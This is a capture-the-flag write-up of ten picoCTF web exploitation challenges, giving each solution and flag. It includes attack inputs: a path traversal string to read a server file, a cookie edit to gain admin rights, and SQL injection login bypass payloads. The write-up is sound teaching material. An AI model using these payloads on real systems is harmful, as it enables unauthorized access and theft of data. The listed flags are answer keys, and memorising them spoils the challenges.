# Web Exploitation

## Includes (100 pts)

> Can you get the flag?
> Go to this [website](http://saturn.picoctf.net:54634/) and see what you can discover.

The website describes the use of include derectives in webpages, and there is a button that says `Say hello`. When I clicked it I got this alert:

```text
This code is in a separate file!
```

Viewing source code of the page, I found that the page uses external CSS stylesheet and JS script.

```css
/* style.css */
body {
  background-color: lightblue;
}

/*  picoCTF{1nclu51v17y_1of2_  */
```

```js
/* script.js */
function greetings()
{
  alert("This code is in a separate file!");
}

//  f7w_2of2_df589022}
```

Both files had comment, and they were parts of the flag.

**Flag: `picoCTF{1nclu51v17y_1of2_f7w_2of2_df589022}`**

## Inspect HTML (100 pts)

> Can you get the flag?
>
> Go to this [website](http://saturn.picoctf.net:50920/) and see what you can discover.

The website tells a story of [Histiaeus](https://en.wikipedia.org/wiki/Histiaeus), an ancient Greek historical figure. I checked the source code of the page. 

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>On Histiaeus</title>
  </head>
  <body>
    <h1>On Histiaeus</h1>
    <p>However, according to Herodotus, Histiaeus was unhappy having to stay in
       Susa, and made plans to return to his position as King of Miletus by 
       instigating a revolt in Ionia. In 499 BC, he shaved the head of his 
       most trusted slave, tattooed a message on his head, and then waited for 
       his hair to grow back. The slave was then sent to Aristagoras, who was 
       instructed to shave the slave's head again and read the message, which 
       told him to revolt against the Persians.</p>
    <br>
    <p> Source: Wikipedia on Histiaeus </p>
    <!--picoCTF{1n5p3t0r_0f_h7ml_1fd8425b}-->
  </body>
</html>
```

The flag was hidden in the source code as a comment.

**Flag: `picoCTF{1n5p3t0r_0f_h7ml_1fd8425b}`**

## Local Authority (100 pts)

> Can you get the flag?
>
> Go to this [website](http://saturn.picoctf.net:54554/) and see what you can discover.

The website shows a login form, with username and password fields. Only letters and numbers are accepted for input, it says. The source code did not have any hidden scripts or comments.

I inserted some random credential combos, and every time the result was a failure.

Then I looked at the source code of the error page. What I noticed was the JavaScript codes at the bottom of the code.

```js
      function filter(string) {
        filterPassed = true;
        for (let i =0; i < string.length; i++){
          cc = string.charCodeAt(i);
          
          if ( (cc >= 48 && cc <= 57) ||
               (cc >= 65 && cc <= 90) ||
               (cc >= 97 && cc <= 122) )
          {
            filterPassed = true;     
          }
          else
          {
            return false;
          }
        }
        
        return true;
      }
    
      window.username = "admin";
      window.password = "stro325d098765";
      
      usernameFilterPassed = filter(window.username);
      passwordFilterPassed = filter(window.password);
      
      if ( usernameFilterPassed && passwordFilterPassed ) {
      
        loggedIn = checkPassword(window.username, window.password);
        
        if(loggedIn)
        {
          document.getElementById('msg').innerHTML = "Log In Successful";
          document.getElementById('adminFormHash').value = "2196812e91c29df34f5e217cfd639881";
          document.getElementById('hiddenAdminForm').submit();
        }
        else
        {
          document.getElementById('msg').innerHTML = "Log In Failed";
        }
      }
      else {
        document.getElementById('msg').innerHTML = "Illegal character in username or password."
      }
```

This script features functions to check if the inputs are valid and determine the course of action for each cases. But curiously, the function for checking if the credentials are correct was missing.

Then I found this external script file that was linked at the beginning of `<body>` area:

```js
function checkPassword(username, password)
{
  if( username === 'admin' && password === 'strongPassword098765' )
  {
    return true;
  }
  else
  {
    return false;
  }
}
```

When I used the credentials written above (`admin` and `strongPassword098765`) it redirected to the page where the flag was.

**Flag: `picoCTF{j5_15_7r4n5p4r3n7_05df90c8}`**

## Search source (100 pts)

> The developer of this website mistakenly left an important artifact in the website source, can you find it?
>
> The website is [here](http://saturn.picoctf.net:58133/)

The website had a navigation bar, some information and image, and a contact form. 

I inspected the source code but the page itself did not reveal any information about the flag. So I checked the CSS files included in the page and found the flag in the one of those files.

```css
/* Part of ./css/style.css */

/** banner_main picoCTF{1nsp3ti0n_0f_w3bpag3s_587d12b8} **/
 .carousel-indicators li {
     width: 20px;
     height: 20px;
     border-radius: 11px;
     background-color: #070000;
}
```

**Flag: `picoCTF{1nsp3ti0n_0f_w3bpag3s_587d12b8}`**

## Forbidden Paths (200 pts)

> Can you get the flag?
>
> Here's the [website](http://saturn.picoctf.net:53864/).
>
> We know that the website files live in `/usr/share/nginx/html/` and the flag is at `/flag.txt` but the website is filtering absolute file paths. Can you get past the filter to read the flag?

The site shows what looks like a result of `ls` command: the two dots that mean upper level directory and three text files. Then, at the bottom, there is a text box and a submit button that says `Read`. I entered one of the file names on the list and the result page showed the contents of it. 

When I entered the absolute path of the flag file (`/flag.txt`) the result was "Not Authorized". So, I used the following relative path to reach the flag:

```text
../../../../flag.txt
```

The result revealed the flag.

**Flag: `picoCTF{7h3_p47h_70_5ucc355_6db46514}`**

## Power Cookie (200 pts)

> Can you get the flag?
>
> Go to this [website](http://saturn.picoctf.net:55287/) and see what you can discover.

The website shows a button that says `Continue as guest`. When I clicked it, I got this error message:

```text
We apologize, but we have no guest services at the moment.
```

I inspected the source code and found a JS file.

```js
function continueAsGuest()
{
  window.location.href = '/check.php';
  document.cookie = "isAdmin=0";
}
```

This suggested that the website uses cookie to check availability. It redirects to the check page, with cookie `isAdmin=0`. The number 0 was likely to indicate the boolean value of `false`.

After reaching the check page, I modified the cookie to `isAdmin=1` and refreshed the page. The error message was gone and I got the flag.

**Flag: `picoCTF{gr4d3_A_c00k13_5d2505be}`**

## Roboto Sans (200 pts)

> The flag is somewhere on this web application not necessarily on the website. Find it.
>
> Check [this](http://saturn.picoctf.net:65352/) out.

The site had the same appearance as the one in the "Search source" problem. But this time the CSS did not include the flag but a placeholder.

```css
/** banner_main {{Flag}} **/
 .carousel-indicators li {
     width: 20px;
     height: 20px;
     border-radius: 11px;
     background-color: #070000;
}
```

I checked all JS and CSS files linked in the site, but there was not a single sign of flag. So I used `wget -r` to download every file in the directory. Among the files, there was `robot.txt` file that contained an interesting message:

```text
User-agent *
Disallow: /cgi-bin/
Think you have seen your flag or want to keep looking.

ZmxhZzEudHh0;anMvbXlmaW
anMvbXlmaWxlLnR4dA==
svssshjweuiwl;oiho.bsvdaslejg
Disallow: /wp-admin/
```

The first two line in the second paragraph looked like Base64 text, so I decoded them.

```text
ZmxhZzEudHh0;anMvbXlmaW ==> flag1.txtjs/myfi
anMvbXlmaWxlLnR4dA==    ==> js/myfile.txt
```

The two possible locations for the flag were `flag1.txt` and `js/myfile.txt`. I tried to access `flag1.txt` in the main directory, but it resulted in 404 error; meanwhile, `js/myfile.txt` contained the flag.

```text
picoCTF{Who_D03sN7_L1k5_90B0T5_718c9043}
```

**Flag: `picoCTF{Who_D03sN7_L1k5_90B0T5_718c9043}`**

## Secrets (200 pts)

> We have several pages hidden. Can you find the one with the flag?
>
> The website is running [here](http://saturn.picoctf.net:61481/).

The website features three pages. Source codes had links to some CSS stylesheets, which were located in `secret/assets` directory.

```html
<link href="secret/assets/index.css" rel="stylesheet" />
```

But when I used `WGET` to download the files, nothing odd were found. Then I manually entered `/secret/index.html` after the site address, and got to a new page that says, "Finally. You almost found me. you are doing well", with a GIF file below the text. The page's source code had this line:

```html
<link rel="stylesheet" href="hidden/file.css" />
```

I entered `/secret/hidden/index.html`, which looked like a login page, with options to log in with Twitter or Facebook accounts or log in with Username/Password combination. But the links went to nowhere and the login form was designed to show error message regardless of the input. Though the stylesheet link was again pointing to another directory.

```html
<link href="superhidden/login.css" rel="stylesheet" />
```

`/secret/hidden/superhidden/index.html` page was simply a white page with a line of text: "Finally. You found me. But can you see me". I dragged cursor on the page to see if anything was hidden, and found the flag in the text that had the same color as the background (white).

**Flag: `picoCTF{succ3ss_@h3n1c@10n_39849bcf}`**

## SQL Direct (200 pts)

> Connect to this PostgreSQL server and find the flag!
>
> `psql -h saturn.picoctf.net -p 52867 -U postgres pico`
>
> Password is `postgres`

I connected to the server and checked the list of the database.

```text
COMPUTER:/mnt/d/GitHub/picoCTF2022/sources/secrets$ psql -h saturn.picoctf.net -p 52867 -U postgres pico
Password for user postgres: 
psql (12.9 (Ubuntu 12.9-0ubuntu0.20.04.1), server 14.2 (Debian 14.2-1.pgdg110+1))
WARNING: psql major version 12, server major version 14.
         Some psql features might not work.
Type "help" for help.

pico-# \l
                                 List of databases
   Name    |  Owner   | Encoding |  Collate   |   Ctype    |   Access privileges
-----------+----------+----------+------------+------------+-----------------------
 pico      | postgres | UTF8     | en_US.utf8 | en_US.utf8 |
 postgres  | postgres | UTF8     | en_US.utf8 | en_US.utf8 |
 template0 | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +
           |          |          |            |            | postgres=CTc/postgres
 template1 | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +
           |          |          |            |            | postgres=CTc/postgres
(4 rows)
```

Then I checked the privileges of the account.

```text
pico-# \du
                                   List of roles
 Role name |                         Attributes                         | Member of
-----------+------------------------------------------------------------+-----------
 postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS | {}
```

After checking account privileges, I checked the list of tables.

```text
pico-# \dt
         List of relations
 Schema | Name  | Type  |  Owner
--------+-------+-------+----------
 public | flags | table | postgres
(1 row)
```

I tried to check records of `flags` table, and got the flag.

```text
pico=# SELECT * FROM flags
pico-# \gexec
ERROR:  syntax error at or near "1"
LINE 1: 1
        ^
ERROR:  syntax error at or near "Luke"
LINE 1: Luke
        ^
ERROR:  syntax error at or near "Skywalker"
LINE 1: Skywalker
        ^
ERROR:  syntax error at or near "picoCTF"
LINE 1: picoCTF{L3arN_S0m3_5qL_t0d4Y_31fd14c0}
        ^
ERROR:  syntax error at or near "2"
LINE 1: 2
        ^
ERROR:  syntax error at or near "Leia"
LINE 1: Leia
        ^
ERROR:  syntax error at or near "Organa"
LINE 1: Organa
        ^
ERROR:  syntax error at or near "Alderaan"
LINE 1: Alderaan
        ^
ERROR:  syntax error at or near "3"
LINE 1: 3
        ^
ERROR:  syntax error at or near "Han"
LINE 1: Han
        ^
ERROR:  syntax error at or near "Solo"
LINE 1: Solo
        ^
ERROR:  syntax error at or near "Corellia"
LINE 1: Corellia
```

**Flag: `picoCTF{L3arN_S0m3_5qL_t0d4Y_31fd14c0}`**

## SQLiLite (300 pts)

> Can you login to this website?
>
> Try to login [here](http://saturn.picoctf.net:65096/).

The login form asks for a username and a password. I entered a typical SQL injection statement `1" or "1"="1"; --` as the username. This was

```text
username: 1" or "1"="1"; --
password: 
SQL query: SELECT * FROM users WHERE name='1" or "1"="1"; --' AND password=''
Login failed.
```

The problem seemed that I needed to close the original statement with a single quote instead of a double quote. I tried again with correct syntax.

```text
username: 1' or "1"="1"; --
password: 
SQL query: SELECT * FROM users WHERE name='1' or "1"="1"; --' AND password=''
Logged in! But can you see the flag, it is in plainsight.
```

I got a different message, saying that I successfully logged in. But the flag was not visible even when I selected all. So I checked the source code.

```html
<pre>username: 1&#039; or &quot;1&quot;=&quot;1&quot;; --
password: 
SQL query: SELECT * FROM users WHERE name=&#039;1&#039; or &quot;1&quot;=&quot;1&quot;; --&#039; AND password=&#039;&#039;
</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}</p>
```

**Flag: `picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}`**
